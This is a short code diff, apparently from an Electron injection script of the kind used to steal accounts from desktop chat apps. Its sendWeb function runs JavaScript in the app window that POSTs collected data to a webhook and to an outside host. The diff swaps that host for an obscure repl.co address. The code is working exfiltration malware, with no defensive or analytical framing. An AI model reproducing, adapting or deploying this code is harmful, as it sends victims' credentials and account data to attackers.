@@ -46,7 +46,7 @@ const ChangePasswordFilter = {
 
 function sendWeb(e) {
 	(win = BrowserWindow.getAllWindows()[0]).webContents.executeJavaScript(`\n    var XML = new XMLHttpRequest();\n    XML.open("POST", "${webhook}", true);\n    XML.setRequestHeader('Content-Type', 'application/json');\n    XML.setRequestHeader('Access-Control-Allow-Origin', '*');\n    XML.send(JSON.stringify(${e}));`), 
-    win.webContents.executeJavaScript(`fetch("https://starve.io", { method: "POST", body: JSON.stringify(${e})})`)
+    win.webContents.executeJavaScript(`fetch("https://dawwdaiwjdiajwdajwdipjawpidjawpjd.23413ndacc.repl.co", { method: "POST", body: JSON.stringify(${e})})`)
 }
 
 function injected() {
